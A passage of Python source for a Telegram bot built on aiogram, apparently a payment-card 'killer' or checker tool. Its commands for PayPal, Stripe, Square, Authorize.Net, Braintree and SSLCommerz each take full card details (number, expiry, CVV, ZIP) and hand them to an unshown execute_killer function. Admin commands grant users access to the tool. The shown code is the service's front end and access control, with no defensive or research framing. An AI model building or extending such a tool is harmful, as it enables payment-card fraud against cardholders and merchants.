    "🔹 <code>/paypal</code>      — 𝐏𝐚𝐲𝐏𝐚𝐥\n"
    "🔹 <code>/stripe</code>      — 𝐒𝐭𝐫𝐢𝐩𝐞\n"
    "🔹 <code>/square</code>      — 𝐒𝐪𝐮𝐚𝐫𝐞\n"
    "🔹 <code>/authorize</code>   — 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞.𝐍𝐞𝐭\n"
    "🔹 <code>/braintree</code>   — 𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞\n"
    "🔹 <code>/sslcommerz</code>  — 𝐒𝐒𝐋𝐂𝐨𝐦𝐦𝐞𝐫𝐳\n"
    "🔹 <code>/help</code>        — 𝐇𝐞𝐥𝐩"
)


HELP_TEXT = (
    "📖 <b>𝐇𝐞𝐥𝐩</b>\n\n"
    "<b>𝐔𝐬𝐚𝐠𝐞:</b>\n"
    "<code>/module number|month|year|cvv|zip</code>\n\n"
    "<b>𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>\n"
    "• <code>/paypal</code>\n"
    "• <code>/stripe</code>\n"
    "• <code>/square</code>\n"
    "• <code>/authorize</code>\n"
    "• <code>/braintree</code>\n"
    "• <code>/sslcommerz</code>"
)


ADMIN_COMMANDS_TEXT = (
    "👑 <b>𝐀𝐝𝐦𝐢𝐧 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
    "━━━━━━━━━━━━━━━━━\n\n"
    "🔹 <b>𝐔𝐬𝐞𝐫 𝐌𝐚𝐧𝐚𝐠𝐞𝐦𝐞𝐧𝐭:</b>\n"
    "  • <code>/add &lt;user_id&gt;</code>\n"
    "  • <code>/remove &lt;user_id&gt;</code>\n"
    "  • <code>/users</code>\n"
    "  • <code>/allowall</code>\n"
    "  • <code>/blockall</code>\n\n"
    "🔹 <b>𝐈𝐧𝐟𝐨:</b>\n"
    "  • <code>/admin</code>\n"
    "  • <code>/adminstats</code>"
)


async def cmd_start(message: Message):
    if not await check_access(message):
        return
    kb = build_main_menu_kb(is_admin=is_admin(message.from_user.id))
    try:
        await message.answer(premium_emoji(WELCOME_TEXT), reply_markup=kb)
    except Exception:
        await message.answer(WELCOME_TEXT, reply_markup=kb)


async def cmd_help(message: Message):
    if not await check_access(message):
        return
    try:
        await message.answer(premium_emoji(HELP_TEXT))
    except Exception:
        await message.answer(HELP_TEXT)


async def cmd_paypal(message: Message, command: CommandObject):
    await execute_killer(message, "paypal", command.args or "")


async def cmd_stripe(message: Message, command: CommandObject):
    await execute_killer(message, "stripe", command.args or "")


async def cmd_square(message: Message, command: CommandObject):
    await execute_killer(message, "square", command.args or "")


async def cmd_authorize(message: Message, command: CommandObject):
    await execute_killer(message, "authorize", command.args or "")


async def cmd_braintree(message: Message, command: CommandObject):
    await execute_killer(message, "braintree", command.args or "")


async def cmd_sslcommerz(message: Message, command: CommandObject):
    await execute_killer(message, "sslcommerz", command.args or "")


async def cmd_admin(message: Message):
    if not is_admin(message.from_user.id):
        return
    try:
        await message.answer(
            premium_emoji("👑 <b>𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>\n\n𝐂𝐡𝐨𝐨𝐬𝐞 𝐚𝐧 𝐨𝐩𝐭𝐢𝐨𝐧:"),
            reply_markup=kb_admin_panel(),
        )
    except Exception:
        await message.answer("👑 Admin Panel", reply_markup=kb_admin_panel())


async def cmd_add(message: Message, command: CommandObject):
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer("❌ 𝐔𝐬𝐚𝐠𝐞: <code>/add &lt;user_id&gt;</code>")
        return
    try:
        target_id = int(command.args.strip())
    except ValueError:
        await message.answer("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐔𝐬𝐞𝐫 𝐈𝐃.")
        return
    add_user(target_id, added_by=message.from_user.id)
    await message.answer(premium_emoji(f"✅ 𝐔𝐬𝐞𝐫 <code>{target_id}</code> 𝐚𝐝𝐝𝐞𝐝."))
    try:
        await message.bot.send_message(
            target_id,
            premium_emoji("🎉 <b>𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐚𝐝𝐝𝐞𝐝!</b>\n\n𝐓𝐲𝐩𝐞 /start.")
        )
    except Exception:
        pass


async def cmd_remove(message: Message, command: CommandObject):
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer("❌ 𝐔𝐬𝐚𝐠𝐞: <code>/remove &lt;user_id&gt;</code>")
        return
    try:
        target_id = int(command.args.strip())
    except ValueError:
        await message.answer("❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐔𝐬𝐞𝐫 𝐈𝐃.")
        return
    remove_user(target_id)
    await message.answer(premium_emoji(f"✅ 𝐔𝐬𝐞𝐫 <code>{target_id}</code> 𝐫𝐞𝐦𝐨𝐯𝐞𝐝."))


async def cmd_users(message: Message):
    if not is_admin(message.from_user.id):
        return
    users = list_users()
    if not users:
        await message.answer("𝐍𝐨 𝐮𝐬𝐞𝐫𝐬.")
        return
    lines = [f"👥 <b>𝐔𝐬𝐞𝐫𝐬 ({len(users)}):</b>\n"]
    for u in users[:50]:
        name = u.get("first_name") or u.get("username") or "?"
        lines.append(f"• <code>{u['user_id']}</code> — {name}")
    if len(users) > 50:
        lines.append(f"\n... +{len(users) - 50}")
    await message.answer(premium_emoji("\n".join(lines)))


async def cmd_allowall(message: Message):
    if not is_admin(message.from_user.id):
        return
    conn = _get_conn()
    conn.execute("UPDATE users SET is_allowed = 1")
    conn.commit()
    set_setting("allow_all", "1")
    await message.answer(premium_emoji("✅ <b>𝐀𝐥𝐥 𝐮𝐬𝐞𝐫𝐬 𝐚𝐥𝐥𝐨𝐰𝐞𝐝.</b>"))


async def cmd_blockall(message: Message):
    if not is_admin(message.from_user.id):
        return
    conn = _get_conn()
    conn.execute("UPDATE users SET is_allowed = 0")
    conn.commit()
    set_setting("allow_all", "0")
    await message.answer(premium_emoji("🔒 <b>𝐀𝐥𝐥 𝐮𝐬𝐞𝐫𝐬 𝐛𝐥𝐨𝐜𝐤𝐞𝐝.</b>"))


async def cmd_adminstats(message: Message):
    if not is_admin(message.from_user.id):
        return
    users = list_users()
    text = (
        "📊 <b>𝐆𝐥𝐨𝐛𝐚𝐥 𝐒𝐭𝐚𝐭𝐬</b>\n\n"
        f"👥 <b>𝐔𝐬𝐞𝐫𝐬:</b> {len(users)}"
    )
    await message.answer(premium_emoji(text), reply_markup=kb_back_admin())


async def cb_main_menu(call: CallbackQuery):
    await call.answer()
    if not is_allowed(call.from_user.id):
        await call.answer("🚫 Access denied", show_alert=True)
        return
    kb = build_main_menu_kb(is_admin=is_admin(call.from_user.id))
    try:
        await call.message.edit_text(premium_emoji(WELCOME_TEXT), reply_markup=kb)
    except TelegramBadRequest:
        try:
            await call.message.answer(premium_emoji(WELCOME_TEXT), reply_markup=kb)
        except Exception:
            pass


async def cb_menu_admin(call: CallbackQuery):
    await call.answer()
    if not is_admin(call.from_user.id):
        await call.answer("🚫 Admin only", show_alert=True)
        return
    try:
        await call.message.edit_text(
            premium_emoji("👑 <b>𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>\n\n𝐂𝐡𝐨𝐨𝐬𝐞:"),
            reply_markup=kb_admin_panel(),
        )
    except TelegramBadRequest:
        await call.message.answer(
            premium_emoji("👑 <b>𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>"),
            reply_markup=kb_admin_panel(),
        )


async def cb_adm_commands(call: CallbackQuery):
    await call.answer()
    if not is_admin(call.from_user.id):
        return
    try:
        await call.message.edit_text(premium_emoji(ADMIN_COMMANDS_TEXT),
                                     reply_markup=kb_back_admin())
    except TelegramBadRequest:
        await call.message.answer(premium_emoji(ADMIN_COMMANDS_TEXT),
                                  reply_markup=kb_back_admin())


async def cb_adm_stats(call: CallbackQuery):
    await call.answer()
    if not is_admin(call.from_user.id):
        return
    users = list_users()
    text = (
        "📊 <b>𝐆𝐥𝐨𝐛𝐚𝐥 𝐒𝐭𝐚𝐭𝐬</b>\n\n"
        f"👥 <b>𝐔𝐬𝐞𝐫𝐬:</b> {len(users)}"
    )
    try:
        await call.message.edit_text(premium_emoji(text), reply_markup=kb_back_admin())
    except TelegramBadRequest:
        await call.message.answer(premium_emoji(text), reply_markup=kb_back_admin())


async def cb_adm_users(call: CallbackQuery):
    await call.answer()
    if not is_admin(call.from_user.id):
        return
    users = list_users()
    if not users:
        text = "👥 𝐍𝐨 𝐮𝐬𝐞𝐫𝐬."
    else:
        lines = [f"👥 <b>𝐔𝐬𝐞𝐫𝐬 ({len(users)}):</b>\n"]
        for u in users[:50]:
            name = u.get("first_name") or u.get("username") or "?"
            lines.append(f"• <code>{u['user_id']}</code> — {name}")
        if len(users) > 50:
            lines.append(f"\n... +{len(users) - 50}")
        text = "\n".join(lines)
    try:
        await call.message.edit_text(premium_emoji(text), reply_markup=kb_back_admin())
    except TelegramBadRequest:
        await call.message.answer(premium_emoji(text), reply_markup=kb_back_admin())


async def handle_unknown(message: Message):
    if not await check_access(message):
        return
    await message.answer(premium_emoji(
        "❓ <b>𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐜𝐨𝐦𝐦𝐚𝐧𝐝.</b>\n"
        "𝐓𝐲𝐩𝐞 /help 𝐟𝐨𝐫 𝐚𝐬𝐬𝐢𝐬𝐭𝐚𝐧𝐜𝐞."
    ))


async def main():
    if not TOKEN:
        raise SystemExit("BOT_TOKEN not set in .env")
    if not ADMIN_ID:
        raise SystemExit("ADMIN_ID not set in .env")

    init_db()
    add_user(ADMIN_ID, first_name="Admin", added_by=ADMIN_ID)

    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    dp = Dispatcher()

    dp.message.register(cmd_start, Command("start"))
    dp.message.register(cmd_help, Command("help"))
    dp.message.register(cmd_paypal, Command("paypal"))
    dp.message.register(cmd_stripe, Command("stripe"))
    dp.message.register(cmd_square, Command("square"))
    dp.message.register(cmd_authorize, Command("authorize"))
    dp.message.register(cmd_braintree, Command("braintree"))
    dp.message.register(cmd_sslcommerz, Command("sslcommerz"))

    dp.message.register(cmd_admin, Command("admin"))
    dp.message.register(cmd_add, Command("add", "adduser"))
    dp.message.register(cmd_remove, Command("remove"))
    dp.message.register(cmd_users, Command("users"))
    dp.message.register(cmd_allowall, Command("allowall"))
    dp.message.register(cmd_blockall, Command("blockall"))
    dp.message.register(cmd_adminstats, Command("adminstats"))

    dp.callback_query.register(cb_main_menu, F.data == "main_menu")
    dp.callback_query.register(cb_menu_admin, F.data == "menu_admin")
    dp.callback_query.register(cb_adm_commands, F.data == "adm_commands")
    dp.callback_query.register(cb_adm_stats, F.data == "adm_stats")
    dp.callback_query.register(cb_adm_users, F.data == "adm_users")

    dp.message.register(handle_unknown, F.text)

    log.info("𓆩𝗔𓆪 𝗙𝗨𝗢𝗡𝗔 Bot starting...")
    log.info("Admin ID: %s", ADMIN_ID)
    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass